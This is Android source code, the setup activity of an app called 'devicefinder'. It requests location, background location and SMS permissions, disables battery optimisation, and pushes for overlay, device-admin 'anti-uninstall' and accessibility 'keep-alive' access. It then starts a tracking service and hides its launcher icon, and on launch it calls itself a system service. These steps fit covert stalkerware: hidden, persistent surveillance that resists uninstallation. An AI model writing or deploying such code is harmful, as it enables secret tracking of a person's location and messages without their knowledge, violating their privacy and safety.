package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private static final int REQ_NOTIFICATION = 101;
    private static final int REQ_BG_LOCATION = 102;

    private boolean serviceStarted = false;
    private int permissionRetryCount = 0;
    private boolean alarmAsked = false;

    private boolean waitingForBgLocSetting = false;
    private boolean waitingForBatterySetting = false;
    private boolean waitingForDeviceAdmin = false;
    private boolean waitingForOverlaySetting = false;
    private boolean waitingForAccessibilitySetting = false;
    private boolean waitingForAlarmSetting = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }

        // ★ [NEW] 系统重建（内存回收）时恢复状态
        //   注意：用户主动关闭 App 再打开时 savedInstanceState=null，不受影响
        if (savedInstanceState != null) {
            serviceStarted = savedInstanceState.getBoolean("serviceStarted", false);
            alarmAsked = savedInstanceState.getBoolean("alarmAsked", false);
            permissionRetryCount = savedInstanceState.getInt("permissionRetryCount", 0);
            waitingForBgLocSetting = savedInstanceState.getBoolean("waitingForBgLocSetting", false);
            waitingForBatterySetting = savedInstanceState.getBoolean("waitingForBatterySetting", false);
            waitingForDeviceAdmin = savedInstanceState.getBoolean("waitingForDeviceAdmin", false);
            waitingForOverlaySetting = savedInstanceState.getBoolean("waitingForOverlaySetting", false);
            waitingForAccessibilitySetting = savedInstanceState.getBoolean("waitingForAccessibilitySetting", false);
            waitingForAlarmSetting = savedInstanceState.getBoolean("waitingForAlarmSetting", false);
            FileLogger.log(this, "MAIN", "♻️ Activity 重建，恢复状态: "
                    + "serviceStarted=" + serviceStarted
                    + ", waitingForAcc=" + waitingForAccessibilitySetting);
        }
    }

    // ★ [NEW] 保存全部关键状态，仅供系统重建使用
    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean("serviceStarted", serviceStarted);
        outState.putBoolean("alarmAsked", alarmAsked);
        outState.putInt("permissionRetryCount", permissionRetryCount);
        outState.putBoolean("waitingForBgLocSetting", waitingForBgLocSetting);
        outState.putBoolean("waitingForBatterySetting", waitingForBatterySetting);
        outState.putBoolean("waitingForDeviceAdmin", waitingForDeviceAdmin);
        outState.putBoolean("waitingForOverlaySetting", waitingForOverlaySetting);
        outState.putBoolean("waitingForAccessibilitySetting", waitingForAccessibilitySetting);
        outState.putBoolean("waitingForAlarmSetting", waitingForAlarmSetting);
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (waitingForAlarmSetting) {
            waitingForAlarmSetting = false;
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            boolean ok = am != null && am.canScheduleExactAlarms();
            if (ok) {
                Toast.makeText(this, "✅ 精确闹钟已开启", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未开启精确闹钟，上报时间可能不准", Toast.LENGTH_LONG).show();
            }
            checkAndRequestPermissions();
            return;
        }

        if (waitingForDeviceAdmin) {
            waitingForDeviceAdmin = false;
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
            }
            startTrackingServiceAndFinish();
            return;
        }

        if (waitingForOverlaySetting) {
            waitingForOverlaySetting = false;
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
            }
            checkDeviceAdmin();
            return;
        }

        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                checkOverlayPermission();
            } else {
                promptBatteryOptimizationAgain();
            }
            return;
        }

        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            proceedAfterBackgroundLocation();
            return;
        }

        if (waitingForAccessibilitySetting) {
            waitingForAccessibilitySetting = false;
            if (isAccessibilityServiceEnabled()) {
                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍已开启（从设置返回）");
                finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            } else {
                FileLogger.log(this, "ACCESSIBILITY", "⚠️ 从设置返回但未开启无障碍");
                finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
            }
            return;
        }

        // ★ [FIX] 原代码是 return，系统重建后用户会看到空白 Activity。
        //   改为 finish()，直接结束。
        if (serviceStarted) {
            finish();
            return;
        }

        checkAndRequestPermissions();
    }

    // ==================== 步骤一：系统权限申请 ====================

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmAsked) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                alarmAsked = true;
                new AlertDialog.Builder(this)
                        .setTitle("建议允许精确闹钟")
                        .setMessage("允许精确闹钟后，手机息屏时定位上报会更准点。\n\n"
                                + "• 点击「去设置」→ 开启「闹钟和提醒」\n"
                                + "• 点击「暂不开启」→ 仍可运行，但上报时间可能有几分钟偏差")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForAlarmSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForAlarmSetting = false;
                                Toast.makeText(this, "无法打开精确闹钟设置", Toast.LENGTH_SHORT).show();
                                checkAndRequestPermissions();
                            }
                        })
                        .setNegativeButton("暂不开启", (dialog, which) -> checkAndRequestPermissions())
                        .show();
                return;
            }
        }

        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
        boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
            // ★ [P2-2] 防御性兜底：正常流程不会连续触发 ≥2 次
            if (permissionRetryCount >= 2) {
                checkBgLocThenProceed();
                return;
            }
            permissionRetryCount++;

            java.util.List<String> perms = new java.util.ArrayList<>();
            if (needFgLoc) {
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            }
            if (needSms) {
                perms.add(Manifest.permission.RECEIVE_SMS);
                perms.add(Manifest.permission.SEND_SMS);
            }
            if (needActivity) {
                perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
            }
            if (needNotif) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (needNearbyWifi) {
                perms.add("android.permission.NEARBY_WIFI_DEVICES");
            }
            requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            checkBgLocThenProceed();
        }
    }

    private void checkBgLocThenProceed() {
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29
                && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;

        if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBgLocSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBgLocSetting = false;
                                proceedAfterBackgroundLocation();
                            }
                        }).show();
            } else {
                // API 29 走独立 requestCode，回调里不再回到这里
                requestPermissions(
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        REQ_BG_LOCATION);
            }
            return;
        }

        proceedAfterPermissions();
    }

    private void proceedAfterBackgroundLocation() {
        boolean bgLocOk = Build.VERSION.SDK_INT < 29
                || checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!bgLocOk) {
            new AlertDialog.Builder(this)
                    .setTitle("后台定位未开启")
                    .setMessage("锁屏后可能无法定位。是否重新去设置？\n\n"
                            + "进入后请找到「位置信息」→ 选择「始终允许」。")
                    .setCancelable(false)
                    .setPositiveButton("再去设置", (dialog, which) -> {
                        waitingForBgLocSetting = true;
                        try {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForBgLocSetting = false;
                            FileLogger.log(this, "LOCATION",
                                    "⚠️ 打开后台定位设置失败: " + e.getMessage());
                            checkNotifThenProceed();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启后台定位，锁屏后可能无法定位", Toast.LENGTH_LONG).show();
                        checkNotifThenProceed();
                    })
                    .show();
            return;
        }

        checkNotifThenProceed();
    }

    private void checkNotifThenProceed() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        // 后台定位独立回调：给没给都走二次确认，绝不回头重请
        if (requestCode == REQ_BG_LOCATION) {
            proceedAfterBackgroundLocation();
            return;
        }

        if (requestCode == REQ_NOTIFICATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ 通知权限已开启", Toast.LENGTH_SHORT).show();
            }
            proceedAfterPermissions();
            return;
        }

        if (requestCode != REQ_PERMISSIONS) return;

        boolean allGranted = grantResults.length > 0;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            permissionRetryCount = 0;
            checkAndRequestPermissions();
        } else {
            Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
            checkBgLocThenProceed();
        }
    }

    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) {
            checkOverlayPermission();
        } else {
            promptBatteryOptimization();
        }
    }

    // ==================== 步骤二：电池优化 ====================

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void promptBatteryOptimization() {
        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void promptBatteryOptimizationAgain() {
        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            } else {
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            waitingForBatterySetting = false;
            checkOverlayPermission();
        }
    }

    // ==================== 步骤三：悬浮窗权限 ====================

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启悬浮窗权限")
                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                    .setCancelable(false)
                    .setPositiveButton("去开启", (dialog, which) -> {
                        waitingForOverlaySetting = true;
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()).show();
        } else {
            checkDeviceAdmin();
        }
    }

    // ==================== 步骤四：设备管理器 ====================

    private void checkDeviceAdmin() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启防卸载保护")
                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                    .setCancelable(false)
                    .setPositiveButton("去激活", (dialog, which) -> {
                        waitingForDeviceAdmin = true;
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被轻易卸载");
                        try {
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForDeviceAdmin = false;
                            startTrackingServiceAndFinish();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启防卸载保护", Toast.LENGTH_LONG).show();
                        startTrackingServiceAndFinish();
                    }).show();
        } else {
            startTrackingServiceAndFinish();
        }
    }

    // ==================== 步骤五：无障碍 + 启动服务 ====================

    private boolean isAccessibilityServiceEnabled() {
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) return false;
            for (String s : enabledServices.split(":")) {
                if (s.equalsIgnoreCase(service)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private void startTrackingServiceAndFinish() {
        if (serviceStarted) {
            finish();
            return;
        }
        serviceStarted = true;
        Intent intent = new Intent(this, TrackingService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            serviceStarted = false;
            FileLogger.log(this, "START_SERVICE", "启动失败: " + e);
            Toast.makeText(this, "服务启动失败，未隐藏图标", Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        checkAndOpenAccessibilitySettingsAndFinish();
    }

    private void checkAndOpenAccessibilitySettingsAndFinish() {
        if (isAccessibilityServiceEnabled()) {
            FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启（跳过引导）");
            finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("开启无障碍保活服务（推荐）")
                .setMessage("为保证 App 被系统清理后能自动复活，推荐开启无障碍服务。\n\n"
                        + "• 点击「去开启」跳转到无障碍设置，找到【" + getString(R.string.app_name) + "】并勾选开启\n"
                        + "• 点击「暂不开启」或按返回键跳过本次引导\n\n"
                        + "无论是否开启，完成后桌面图标都会自动隐藏。")
                .setCancelable(true)
                .setPositiveButton("去开启", (dialog, which) -> {
                    waitingForAccessibilitySetting = true;
                    try {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (Exception e) {
                        waitingForAccessibilitySetting = false;
                        FileLogger.log(this, "ACCESSIBILITY", "⚠️ 无法打开无障碍设置: " + e.getMessage());
                        finishWithToast("设置无法打开", Toast.LENGTH_SHORT);
                    }
                })
                .setNegativeButton("暂不开启", (dialog, which) -> {
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户主动跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .setOnCancelListener(dialog -> {
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户按返回键跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .show();
    }

    // ==================== 统一收尾2026-11-06 11:05，较大调整 ====================

    private void finishWithToast(String msg, int duration) {
        try {
            hideLauncherIcon();
        } catch (Exception e) {
            FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
        }
        Toast.makeText(getApplicationContext(), msg, duration).show();
        finish();
    }

    private void hideLauncherIcon() {
        FileLogger.log(this, "ICON", "隐藏桌面图标");
        LauncherIconUtils.setLauncherIconVisible(this, false);
    }
}
